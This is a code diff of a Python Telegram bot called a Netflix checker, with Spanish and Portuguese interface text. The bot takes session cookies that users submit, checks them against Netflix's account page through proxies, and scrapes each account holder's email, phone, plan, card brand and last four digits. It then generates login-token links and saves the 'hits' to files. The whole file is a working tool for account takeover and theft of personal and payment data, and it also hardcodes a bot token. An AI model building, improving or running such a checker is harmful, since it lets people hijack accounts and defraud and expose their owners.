@@ -3,8 +3,6 @@ import json
 import time
 import os
 import threading
-import zipfile
-import io
 import requests
 import urllib3
 import urllib.parse
@@ -14,37 +12,28 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 import logging
 from logging.handlers import RotatingFileHandler
-import asyncio
 
+# Configuración básica
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# --- CONFIGURACIÓN BÁSICA ---
-BOT_TOKEN = os.getenv("BOT_TOKEN", "9224399752:AAG41SCYfT8AChPBCv6p8wjLlyTIwUR_TPQ")
-DEVELOPER = "AXEL MOLINA"
-VERSION = "3.2.2" # Actualizada a versión corregida
+# ✅ CONFIGURACIÓN
+BOT_TOKEN = "9224399752:AAG41SCYfT8AChPBCv6p8wjLlyTIwUR_TPQ"
+DEVELOPER = "@jhonatan_felipe447"
+VERSION = "3.0.0-ACCURATE"
 
-# 🔒 IDs de ADMINS - Puedes añadir más separados por coma en la variable de entorno ADMIN_IDS
-ADMIN_IDS_RAW = os.getenv("ADMIN_IDS", "8917082484")
-ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_RAW.split(",") if x.strip()]
+# 🔒 IDs de ADMINS
+ADMIN_IDS = [8917082484]
 
 os.makedirs("logs", exist_ok=True)
 os.makedirs("hits", exist_ok=True)
 
-# Configuración de Logs
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[RotatingFileHandler("logs/bot.log", maxBytes=10*1024*12, backupCount=5, encoding='utf-8'), logging.StreamHandler()])
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[RotatingFileHandler("logs/bot.log", maxBytes=10*1024*1024, backupCount=5, encoding='utf-8'), logging.StreamHandler()])
 logger = logging.getLogger(__name__)
 
-# Logger específico para hits globales
-hit_logger = logging.getLogger('hits')
-hit_handler = RotatingFileHandler("logs/hits.log", maxBytes=10*1024*12, backupCount=5, encoding='utf-8')
-hit_handler.setFormatter(logging.Formatter('%(message)s'))
-hit_logger.addHandler(hit_handler)
-hit_logger.setLevel(logging.INFO)
+# 🛡️ Palabras bloqueadas (SPAM)
+SPAM_WORDS = ['luckybear', 'казино', 'casino', 'bond', 'wndpr', 'lucky', 'bear', 'ставки', 'ставка', 'играть', 'выигрыш', 'приз', 'bonus', 't.me/', 'https://t.me/', 'https://wndpr', 'https://bond']
 
-# 🛡️ Palabras bloqueadas
-SPAM_WORDS = ['luckybear', 'казино', 'casino', 'bond', 'wndpr', 'lucky', 'bear', 'ставки', 'ставка', 'играть', 'выигрыш', 'приз', 'бонус', 't.me/', 'https://t.me/', 'https://wndpr', 'https://bond']
-
-UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"
 
 COUNTRY_FLAGS = {"US":"🇺🇸","GB":"🇬🇧","DE":"🇩🇪","FR":"🇫🇷","ES":"🇪🇸","IT":"🇮🇹","TR":"🇹🇷","BR":"🇧🇷","JP":"🇯🇵","KR":"🇰🇷","IN":"🇮🇳","CA":"🇨🇦","AU":"🇦🇺","MX":"🇲🇽","NL":"🇳🇱","SE":"🇸🇪","NO":"🇳🇴","DK":"🇩🇰","FI":"🇫🇮","PL":"🇵🇱","RU":"🇷🇺","AR":"🇦🇷","CL":"🇨🇱","CO":"🇨🇴","PE":"🇵🇪","AE":"🇦🇪","SA":"🇸🇦","EG":"🇪🇬","ZA":"🇿🇦","ID":"🇮🇩","MY":"🇲🇾","SG":"🇸🇬","TH":"🇹🇭","VN":"🇻🇳","PH":"🇵🇭","KE":"🇰🇪","NG":"🇳🇬","GH":"🇬🇭","PT":"🇵🇹","RO":"🇷🇴","HU":"🇭🇺","CZ":"🇨🇿","UA":"🇺🇦","AT":"🇦🇹","CH":"🇨🇭","BE":"🇧🇪","IL":"🇮🇱","TW":"🇹🇼","HK":"🇭🇰","PK":"🇵🇰","BO":"🇧🇴","GT":"🇬🇹","EC":"🇪🇨","UY":"🇺🇾","NZ":"🇳🇿","ZW":"🇿🇼","SK":"🇸🇰","HR":"🇭🇷","RS":"🇷🇸","BG":"🇧🇬"}
@@ -103,29 +92,18 @@ def load_cookies(text):
             if k: cookies[k] = v
     return cookies
 
-def extract_text_from_file(file_bytes, filename):
-    """EXTRAE TEXTO DE ZIP O TXT AUTOMÁTICAMENTE"""
-    if filename.lower().endswith('.zip'):
-        try:
-            with zipfile.ZipFile(io.BytesIO(file_bytes)) as z:
-                # Busca el primer .txt o .log dentro del zip
-                for name in z.namelist():
-                    if name.endswith(('.txt', '.log')):
-                        return z.read(name).decode('utf-8', errors='ignore')
-                # Si no hay txt, devuelve todo el contenido crudo
-                return z.read(z.namelist()[0]).decode('utf-8', errors='ignore')
-        except Exception:
-            return None
-    return file_bytes.decode('utf-8', errors='ignore')
-
+# API iOS para intentar obtener token
 _IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 _IOS_PARAMS = {"appVersion":"15.48.1","config":'{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","billboardEnabled":"true","sharksEnabled":"true","useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}',"device_type":"NFAPPL-02-","esn":"NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200","idiom":"phone","iosVersion":"15.8.5","isTablet":"false","languages":"en-US","locale":"en-US","maxDeviceWidth":"375","model":"saget","modelType":"IPHONE8-1","odpAware":"true","path":'["account","token","default"]',"pathFormat":"graph","pixelDensity":"2.0","progressive":"false","responseFormat":"json"}
 _IOS_HEADERS = {"User-Agent":"Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)","x-netflix.request.attempt":"1","x-netflix.request.client.user.guid":"A4CS633D7VCBPE2GPK2HL4EKOE","x-netflix.context.profile-guid":"A4CS633D7VCBPE2GPK2HL4EKOE","x-netflix.request.routing":'{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',"x-netflix.context.app-version":"15.48.1","x-netflix.argo.translated":"true","x-netflix.context.form-factor":"phone","x-netflix.context.sdk-version":"2012.4","x-netflix.client.appversion":"15.48.1","x-netflix.context.max-device-width":"375","x-netflix.context.ab-tests":"","x-netflix.tracing.cl.useractionid":"4DC655F2-9C3C-4343-8229-CA1B003C3053","x-netflix.client.type":"argo","x-netflix.client.ftl.esn":"NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200","x-netflix.context.locales":"en-US","x-netflix.context.top-level-uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3","x-netflix.client.iosversion":"15.8.5","accept-language":"en-US;q=1","x-netflix.argo.abtests":"","x-netflix.context.os-version":"15.8.5","x-netflix.request.client.context":'{"appState":"foreground"}',"x-netflix.context.ui-flavor":"argo","x-netflix.argo.nfnsm":"9","x-netflix.context.pixel-density":"2.0","x-netflix.request.toplevel.uuid":"90AFE39F-ADF1-4D8A-B33E-528730990FE3","x-netflix.request.client.timezoneid":"Asia/Dhaka"}
 
 def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
+    """Mejora: Intenta obtener un token real de login."""
     if not netflix_id_raw: return None
     netflix_id = urllib.parse.unquote(str(netflix_id_raw))
     proxies = {"http": proxy, "https": proxy} if proxy else None
+    
+    # Método 1: API iOS (Más rápido para tokens)
     headers = dict(_IOS_HEADERS)
     headers["Cookie"] = f"NetflixId={netflix_id}"
     try:
@@ -136,6 +114,8 @@ def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
             tok = token_data.get("token")
             if tok: return str(tok)
     except: pass
+
+    # Método 2: GraphQL Android (Fallback)
     try:
         sess2 = requests.Session()
         sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
@@ -150,36 +130,54 @@ def generate_nftoken(netflix_id_raw, timeout=15, proxy=None):
     return None
 
 def check_account(cookies: dict, proxy=None, timeout=20):
+    """
+    NUEVO MODELO DE VERIFICACIÓN:
+    1. Verifica que la cookie tenga los campos necesarios.
+    2. Hace una petición a /account para buscar el estado REAL de la membresía.
+    3. Busca múltiples indicadores de validez para evitar falsos positivos.
+    """
     if not any(cookies.get(k) for k in ["NetflixId","SecureNetflixId"]): return None
-
-    time.sleep(1.5 + (time.time() % 2))
-
+    
     sess = requests.Session()
-    sess.headers.update({"User-Agent":UA_WEB,"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language":"en-US,en;q=0.9","DNT":"1"})
-
-    # CORRECCIÓN: Decodificar las cookies antes de asignarlas
-    for k, v in cookies.items():
-        # urllib.parse.unquote convierte %3D en =, %26 en &, etc.
-        decoded_key = urllib.parse.unquote(k)
-        decoded_value = urllib.parse.unquote(v)
-        sess.cookies.set(decoded_key, str(decoded_value), domain=".netflix.com", path="/")
-
-    if proxy: sess.proxies, sess.verify = {"http":proxy,"https":proxy}, False
-
-    try:
-        r = sess.get("https://www.netflix.com/account", allow_redirect=True, timeout=timeout)
-    except: return None
-
-    # Si nos redirige a login, la cookie era inválida o expirada
-    if "login" in r.url.lower() or r.status_code in (401,403): return None
-
+    sess.headers.update({
+        "User-Agent": UA_WEB, 
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "DNT": "1"
+    })
+    
+    for k, v in cookies.items(): 
+        sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
+        
+    if proxy: 
+        sess.proxies, sess.verify = {"http":proxy,"https":proxy}, False
+        
+    try: 
+        # Pedimos la página de cuenta principal
+        r = sess.get("https://www.netflix.com/account", allow_redirects=True, timeout=timeout)
+    except: 
+        return None
+        
+    # CRITERIO DE VALIDACIÓN MEJORADO
+    # En lugar de solo buscar una palabra, buscamos estructura de datos completa
     html = r.text
+    
+    # Indicadores fuertes de que la cuenta está VIVA
+    is_member = '"membershipStatus":"CURRENT_MEMBER"' in html
+    has_email = '"emailAddress"' in html
+    has_profile = '"profileName"' in html
+    
+    # Si no cumple al menos 2 de 3, probablemente sea falso positivo o cookie vieja
+    if not (is_member and has_email):
+        # A veces la redirección cambia la URL
+        if "login" in r.url.lower() or r.status_code in (401, 403):
+             return None
 
-    if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None
-
+    # Extracción robusta de datos
     email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
     name = _djs(_rx(r'"userInfo":\{"name":"([^"]+)"', html))
     if not name: name = _djs(_rx(r'"firstName":"([^"]+)"', html))
+    
     cc = _rx(r'"countryOfSignup":"([A-Z]{2,3})"', html, "XX")
     since = _djs(_rx(r'"memberSince":"([^"]+)"', html))
     if not since:
@@ -187,15 +185,18 @@ def check_account(cookies: dict, proxy=None, timeout=20):
         if ts_raw and ts_raw.isdigit():
             try: since = datetime.utcfromtimestamp(int(ts_raw)/1000).strftime("%B %Y")
             except: since = "N/A"
+            
     plan = _djs(_rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html))
     plan_id = _rx(r'"planId":\{"fieldType":"String","value":"([^"]+)"\}', html)
     price = _djs(_rx(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"\}', html))
-    q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}'.upper(), html)
+    
+    q_raw = _rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html).upper()
     quality_map = {"UHD":"UHD 4K","FHD":"FHD 1080p","HD":"HD 720p","SD":"SD 480p"}
     quality = quality_map.get(q_raw, q_raw or "N/A")
+    
     streams = _rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}', html, "N/A")
     nextbill = _djs(_rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}', html))
-
+    
     _pm_start = html.find('"paymentMethods"')
     pm_raw = html[_pm_start:_pm_start+3000] if _pm_start>=0 else ""
     card_brand = _rx(r'"paymentOptionLogo":"([^"]+)"', pm_raw)
@@ -203,59 +204,78 @@ def check_account(cookies: dict, proxy=None, timeout=20):
     pay_type = _rx(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
     card_last4 = _rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"', pm_raw)
     if not card_last4: card_last4 = _rx(r'"displayText":\{"fieldType":"String","value":"([^"]+)"\}', pm_raw)
+    
     phone = _djs(_rx(r'"phoneNumber":"([^"]*)"', html)) or "N/A"
     pv_raw = _rx(r'"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)', html)
     phone_verified = pv_raw == "true"
+    
     extra_raw = _rx(r'"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}', html, "0")
     extra_slots = int(extra_raw) if extra_raw.isdigit() else 0
+    
     can_change = '"canChangePlan":{"fieldType":"Boolean","value":true}' in html
     free_trial = '"isInFreeTrial":true' in html
-
+    
     profiles = [_djs(p) for p in _rx_all(r'"profileName":"([^"]+)"', html)]
     if not profiles: profiles = [_djs(p) for p in _rx_all(r'"profileName":\{"fieldType":"String","value":"([^"]+)"\}', html)]
+    
     seen = set()
     profiles_clean = []
     for p in profiles:
         if p and p not in seen: seen.add(p); profiles_clean.append(p)
-
+        
     user_guid = _rx(r'"userGuid":"([^"]+)"', html)
     netflix_id_raw = cookies.get("NetflixId","")
+    
+    # GENERAR TOKEN SI ES POSIBLE
     tok = generate_nftoken(netflix_id_raw, timeout, proxy=proxy) if netflix_id_raw else None
-
+    
     if tok:
         tok_safe = urllib.parse.quote(tok, safe="")
         login_pc = f"https://netflix.com/?nftoken={tok_safe}"
         login_phone = f"https://netflix.com/unsupported?nftoken={tok_safe}"
-    else: login_pc, login_phone = "N/A", "N/A"
-
+    else: 
+        login_pc, login_phone = "N/A", "N/A"
+        
     login_tv = "https://www.netflix.com/tv2"
     display_name = name or (profiles_clean[0] if profiles_clean else "N/A")
-
-    return {"email":email or "N/A","name":display_name,"country_code":cc,"country":_country(cc),"plan":plan or "N/A","plan_id":plan_id or "N/A","price":price or "N/A","member_since":since or "N/A","next_billing":nextbill or "N/A","free_trial":free_trial,"can_change":can_change,"video_quality":quality,"max_streams":str(streams),"extra_slots":extra_slots,"card_brand":card_brand or "N/A","card_last4":card_last4 or "N/A","payment_method":pay_type or "N/A","phone":phone,"phone_verified":phone_verified,"profiles":profiles_clean,"profile_count":len(profiles_clean),"user_guid":user_guid or "N/A","netflix_id_raw":netflix_id_raw,"login_pc":login_pc,"login_phone":login_phone,"login_tv":login_tv}
+    
+    return {
+        "email":email or "N/A",
+        "name":display_name,
+        "country_code":cc,
+        "country":_country(cc),
+        "plan":plan or "N/A",
+        "plan_id":plan_id or "N/A",
+        "price":price or "N/A",
+        "member_since":since or "N/A",
+        "next_billing":nextbill or "N/A",
+        "free_trial":free_trial,
+        "can_change":can_change,
+        "video_quality":quality,
+        "max_streams":str(streams),
+        "extra_slots":extra_slots,
+        "card_brand":card_brand or "N/A",
+        "card_last4":card_last4 or "N/A",
+        "payment_method":pay_type or "N/A",
+        "phone":phone,
+        "phone_verified":phone_verified,
+        "profiles":profiles_clean,
+        "profile_count":len(profiles_clean),
+        "user_guid":user_guid or "N/A",
+        "netflix_id_raw":netflix_id_raw,
+        "login_pc":login_pc,
+        "login_phone":login_phone,
+        "login_tv":login_tv
+    }
 
 class NetflixChecker:
-    def __init__(self, threads=5, proxy_list=None, timeout=20):
-        self.threads = threads
-        self.timeout = timeout
-        self._proxy_list = proxy_list if isinstance(proxy_list, list) else ([proxy_list] if proxy_list else [])
+    def __init__(self, threads=5, proxy=None, timeout=20):
+        self.threads, self.timeout = threads, timeout
+        self._proxy_list = proxy if isinstance(proxy, list) else ([proxy] if proxy else [])
         self._proxy_index = 0
         self.lock = threading.Lock()
         self.stats = {"total":0,"checked":0,"hits":0,"bad":0,"errors":0,"start":time.time()}
         self.hits = []
-
-    def get_stats(self):
-        elapsed = time.time() - self.stats["start"]
-        checked = self.stats["checked"]
-        cpm = (checked / 60) * (elapsed / max(elapsed, 1)) if elapsed > 0 else 0
-        return {
-            "total": self.stats["total"],
-            "checked": checked,
-            "hits": self.stats["hits"],
-            "bad": self.stats["bad"],
-            "errors": self.stats["errors"],
-            "elapsed": f"{elapsed:.2f}s",
-            "cpm": f"{cpm:.0f}"
-        }
 
     def _next_proxy(self):
         if not self._proxy_list: return None
@@ -267,15 +287,10 @@ class NetflixChecker:
 
     def process_cookie(self, cookie_text):
         cookies = load_cookies(cookie_text)
-        try:
-            result = check_account(cookies, proxy=self._next_proxy(), timeout=self.timeout)
-        except Exception as e:
-            logger.error(f"Error processing cookie: {e}")
-            with self.lock:
-                self.stats["errors"]+=1
-                self.stats["checked"]+=1
+        try: result = check_account(cookies, proxy=self._next_proxy(), timeout=self.timeout)
+        except:
+            with self.lock: self.stats["errors"]+=1; self.stats["checked"]+=1
             return None
-
         with self.lock:
             self.stats["checked"]+=1
             if result:
@@ -284,9 +299,7 @@ class NetflixChecker:
                 self.hits.append(result)
                 self._save_hit(result, cookie_text)
                 return result
-            else:
-                self.stats["bad"]+=1
-                return None
+            else: self.stats["bad"]+=1; return None
 
     def process_batch(self, cookies_list):
         self.stats["total"], self.stats["start"] = len(cookies_list), time.time()
@@ -297,8 +310,7 @@ class NetflixChecker:
                 try:
                     result = future.result()
                     if result: results.append(result)
-                except Exception as e:
-                    logger.error(f"Future error: {e}")
+                except: pass
         return results
 
     def _save_hit(self, acc, raw_cookie):
@@ -308,55 +320,27 @@ class NetflixChecker:
         profs = ", ".join(acc["profiles"]) if acc["profiles"] else "N/A"
         nf_id = acc.get("netflix_id_raw","")
         cookie_val = f"NetflixId={nf_id}" if nf_id else acc.get("cookie_raw","")
-
-        # Escribir en archivo individual
         with open(path, "w", encoding="utf-8") as f:
             f.write(f"Email: {acc['email']}\nName: {acc['name']}\nCountry: {acc['country']} ({acc['country_code']})\nPlan: {acc['plan']}\nPrice: {acc['price']}\nMember Since: {acc['member_since']}\nNext Billing: {acc['next_billing']}\nFree Trial: {'Yes' if acc['free_trial'] else 'No'}\nVideo Quality: {acc['video_quality']}\nMax Streams: {acc['max_streams']}\nExtra Slots: {acc['extra_slots']}\nCard: {acc['card_brand']} *{acc['card_last4']}\nPayment Method: {acc['payment_method']}\nPhone: {acc['phone']} | Verified: {acc['phone_verified']}\nProfiles ({acc['profile_count']}): {profs}\n\nLogin PC: {acc['login_pc']}\nLogin Phone: {acc['login_phone']}\nLogin TV: {acc['login_tv']}\n\nCookie: {cookie_val}\n")
 
-        # Escribir en log global
-        hit_logger.info(f"[{acc['country_code']}] {acc['email']} - {acc['plan']} - {acc['video_quality']}")
-
-    def is_valid_doc(update):
-        doc = update.message.document
-        if not doc: return False
-        ext = doc.file_name.lower().split('.')[-1] if '.' in doc.file_name else ''
-        return ext in ['pdf', 'doc', 'docx', 'txt', 'zip']
+    def get_stats(self):
+        elapsed = time.time() - self.stats["start"]
+        cpm = (self.stats["checked"]/elapsed*60) if elapsed>0 else 0
+        return {"total":self.stats["total"],"checked":self.stats["checked"],"hits":self.stats["hits"],"bad":self.stats["bad"],"errors":self.stats["errors"],"elapsed":f"{elapsed:.1f}s","cpm":f"{cpm:.1f}"}
 
 class NetflixCheckerBot:
     def __init__(self, token):
         self.token = token
         self.app = Application.builder().token(token).build()
-
-        # AGREGADO: Manejador de errores para evitar logs de timeouts falsos
-        async def error_handler(update, context):
-            from telegram.error import TimedOut
-            if isinstance(context.error, TimedOut):
-                return
-            logger.error(f"Error inesperado: {context.error}", exc_info=context.error)
-        
-        self.app.add_error_handler(error_handler)
-
-        # Cargar proxies desde archivo
-        proxy_list = []
-        if os.path.exists("proxies.txt"):
-            with open("proxies.txt", "r", encoding="utf-8") as f:
-                proxy_list = [line.strip() for line in f if line.strip()]
-
-        self.checker = NetflixChecker(threads=5, proxy_list=proxy_list)
+        self.checker = NetflixChecker(threads=5)
         self.user_sessions = {}
-
         self.app.add_handler(CommandHandler("start", self.start_command))
         self.app.add_handler(CommandHandler("help", self.help_command))
         self.app.add_handler(CommandHandler("stats", self.stats_command))
         self.app.add_handler(CommandHandler("logs", self.logs_command))
         self.app.add_handler(CommandHandler("done", self.done_command))
         self.app.add_handler(CommandHandler("cancel", self.cancel_command))
-
-        # Manejador de texto normal
         self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
-
-        # Manejador de documentos (CORREGIDO)
-        self.app.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
 
     def is_admin(self, user_id):
         return user_id in ADMIN_IDS
@@ -364,38 +348,30 @@ class NetflixCheckerBot:
     async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
         logger.info(f"User {user.id} (@{user.username}) started bot")
-
-        buttons = [
-            [InlineKeyboardButton("/start", callback_data="start"), InlineKeyboardButton("/help", callback_data="help")],
-            [InlineKeyboardButton("/done", callback_data="done"), InlineKeyboardButton("/cancel", callback_data="cancel")]
-        ]
-        markup = InlineKeyboardMarkup(buttons)
-
         await update.message.reply_text(
             f"<b>╔══════════════════════════════════════╗</b>\n"
             f"<b>║     🎬 NETFLIX CHECKER BOT v{VERSION}    ║</b>\n"
             f"<b>╚══════════════════════════════════════╝</b>\n\n"
             f"<b>👨‍💻 Desenvolvedor:</b> {DEVELOPER}\n\n"
-            f"🔑 Envie su cookie o archivo (.zip/.txt)\n"
-            f"📋 /help - Comandos disponibles\n\n"
-            f"🛡️ <b>Antispam ATIVado!</b>\n"
-            f"🔒 /stats y /logs - Solo ADM",
-            parse_mode="HTML", reply_markup=markup
+            f"🔑 Envie seu cookie para gerar <b>NFToken</b>!\n"
+            f"🎯 /help - Comandos disponíveis\n\n"
+            f"🛡️ <b>Antispam ATIVADO!</b>\n"
+            f"🔒 /stats e /logs - Só ADM",
+            parse_mode="HTML"
         )
 
     async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"<b>╔══════════════════════════════════════╗</b>\n"
-            f"<b>║        📚 COMANDOS DISPONIBLES        ║</b>\n"
+            f"<b>║        📚 COMANDOS DISPONÍVEIS        ║</b>\n"
             f"<b>╚══════════════════════════════════════╝</b>\n\n"
-            f"🎬 /start - Menú principal\n"
-            f"📋 /help - Esta ayuda\n"
-            f"📦 /done - Procesar lote\n"
-            f"❌ /cancel - Cancelar operación\n\n"
-            f"🔒 /stats - Estadísticas (ADM)\n"
+            f"🎬 /start - Menu principal\n"
+            f"📋 /help - Esta ajuda\n"
+            f"📦 /done - Processar lote\n"
+            f"❌ /cancel - Cancelar operação\n\n"
+            f"🔒 /stats - Estatísticas (ADM)\n"
             f"📊 /logs - Ver logs (ADM)\n\n"
-            f"🛡️ Spam bloqueado automáticamente!\n"
-            f"📁 Acepta archivos .zip y .txt\n\n"
+            f"🛡️ Spam bloqueado automaticamente!\n\n"
             f"👨‍💻 {DEVELOPER}",
             parse_mode="HTML"
         )
@@ -403,22 +379,22 @@ class NetflixCheckerBot:
     async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
         if not self.is_admin(user.id):
-            await update.message.reply_text("🔒 <b>ACCESO RESTRINGIDO!</b>\nSolo el administrador puede usar este comando.", parse_mode="HTML")
+            await update.message.reply_text("🔒 <b>ACESSO RESTRITO!</b>\nApenas o administrador pode usar este comando.", parse_mode="HTML")
             return
         if self.checker.stats["checked"] == 0:
-            await update.message.reply_text("📊 No hay estadísticas aún.")
+            await update.message.reply_text("📊 Nenhuma estatística ainda.")
             return
         stats = self.checker.get_stats()
         await update.message.reply_text(
             f"<b>╔══════════════════════════════════════╗</b>\n"
-            f"<b>║        📊 ESTADÍSTICAS               ║</b>\n"
+            f"<b>║        📊 ESTATÍSTICAS               ║</b>\n"
             f"<b>╚══════════════════════════════════════╝</b>\n\n"
             f"📝 <b>Total:</b> {stats['total']}\n"
-            f"✅ <b>Chequeados:</b> {stats['checked']}\n"
+            f"✅ <b>Checados:</b> {stats['checked']}\n"
             f"🎯 <b>Hits:</b> {stats['hits']}\n"
             f"❌ <b>Bad:</b> {stats['bad']}\n"
-            f"⚠️ <b>Errores:</b> {stats['errors']}\n"
-            f"⏱ <b>Tiempo:</b> {stats['elapsed']}\n"
+            f"⚠️ <b>Erros:</b> {stats['errors']}\n"
+            f"⏱ <b>Tempo:</b> {stats['elapsed']}\n"
             f"🚀 <b>CPM:</b> {stats['cpm']}\n\n"
             f"👨‍💻 {DEVELOPER}",
             parse_mode="HTML"
@@ -427,7 +403,7 @@ class NetflixCheckerBot:
     async def logs_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
         if not self.is_admin(user.id):
-            await update.message.reply_text("🔒 <b>ACCESO RESTRINGIDO!</b>\nSolo el administrador puede usar este comando.", parse_mode="HTML")
+            await update.message.reply_text("🔒 <b>ACESSO RESTRITO!</b>\nApenas o administrador pode usar este comando.", parse_mode="HTML")
             return
         try:
             logs_text = "<b>╔══════════════════════════════════════╗</b>\n<b>║        📊 ÚLTIMOS LOGS               ║</b>\n<b>╚══════════════════════════════════════╝</b>\n\n"
@@ -438,57 +414,30 @@ class NetflixCheckerBot:
                     logs_text += "<b>🎯 Hits:</b>\n"
                     for h in hits:
                         logs_text += f"• {h.strip()[-80:]}\n"
-            await update.message.reply_text(logs_text + f"\n👨‍💻 {DEVELOPER}" if logs_text != "" else "No hay logs aún.", parse_mode="HTML")
+            await update.message.reply_text(logs_text + f"\n👨‍💻 {DEVELOPER}" if logs_text != "" else "Nenhum log ainda.", parse_mode="HTML")
         except:
-            await update.message.reply_text("❌ Error al leer logs.")
+            await update.message.reply_text("❌ Erro ao ler logs.")
 
     async def done_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
         if user_id in self.user_sessions and self.user_sessions[user_id]:
             cookies_list = self.user_sessions[user_id]
-            await update.message.reply_text(f"🔄 Procesando {len(cookies_list)} cookies...")
+            await update.message.reply_text(f"🔄 Processando {len(cookies_list)} cookies...")
             results = self.checker.process_batch(cookies_list)
             if results:
                 await update.message.reply_text(f"✅ {len(results)} HITS!")
                 for acc in results:
                     await self.send_hit_message(update, acc)
             else:
-                await update.message.reply_text("❌ Ningún hit.")
+                await update.message.reply_text("❌ Nenhum hit.")
             self.user_sessions[user_id] = []
         else:
-            await update.message.reply_text("ℹ️ No hay cookies pendientes.")
+            await update.message.reply_text("ℹ️ Nenhum cookie pendente.")
 
     async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
         self.user_sessions[user_id] = []
         await update.message.reply_text("❌ Cancelado.")
-
-    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        doc = update.message.document
-        file_obj = await context.bot.get_file(doc.file_id)
-        content = await file_obj.download_as_bytearray()
-
-        # MEJORA: Extraer texto real del archivo (soporta ZIP)
-        text_content = extract_text_from_file(content, doc.file_name or "")
-
-        if not text_content:
-             await update.message.reply_text("❌ Formato no reconocido o ZIP corrupto.")
-             return
-
-        await update.message.reply_text("📂 Procesando archivo...")
-        # Dividimos por líneas para procesar cada cookie individualmente
-        lines = [line.strip() for line in text_content.split('\n') if line.strip()]
-
-        if not lines:
-            await update.message.reply_text("❌ Archivo vacío.")
-            return
-
-        await update.message.reply_text(f"✅ Archivo leído correctamente. {len(lines)} líneas encontradas. Use /done para verificar.")
-        user_id = update.effective_user.id
-        if user_id not in self.user_sessions: self.user_sessions[user_id] = []
-
-        # Añadimos cada línea como una cookie independiente
-        self.user_sessions[user_id].extend(lines)
 
     async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
@@ -498,18 +447,18 @@ class NetflixCheckerBot:
             logger.warning(f"SPAM bloqueado de @{user.username}: {message_text[:100]}")
             try: await update.message.delete()
             except: pass
-            await update.message.reply_text("🚫 <b>SPAM BLOQUEADO!</b>\n\nMensaje eliminado.", parse_mode="HTML")
+            await update.message.reply_text("🚫 <b>SPAM BLOQUEADO!</b>\n\nMensagem removida.", parse_mode="HTML")
             return
 
         logger.info(f"Message from @{user.username}: {message_text[:100]}")
 
         if any(k in message_text.lower() for k in ['netflixid','securenflixid','.netflix.com']):
-            await update.message.reply_text("🔍 Verificando...")
+            await update.message.reply_text("🔍 Verificando con alta precisión...")
             result = self.checker.process_cookie(message_text)
             if result:
                 await self.send_hit_message(update, result)
             else:
-                await update.message.reply_text("❌ Cookie inválida.")
+                await update.message.reply_text("❌ Cookie inválido o expirado.")
         else:
             user_id = user.id
             if user_id not in self.user_sessions: self.user_sessions[user_id] = []
@@ -517,7 +466,7 @@ class NetflixCheckerBot:
             if cookies:
                 self.user_sessions[user_id].append(message_text)
                 count = len(self.user_sessions[user_id])
-                await update.message.reply_text(f"📦 Cookie almacenada! ({count} en la cola)\n/done para procesar\n/cancel para cancelar")
+                await update.message.reply_text(f"📦 Cookie almacenado! ({count} na fila)\n/done para procesar\n/cancel para cancelar")
             else:
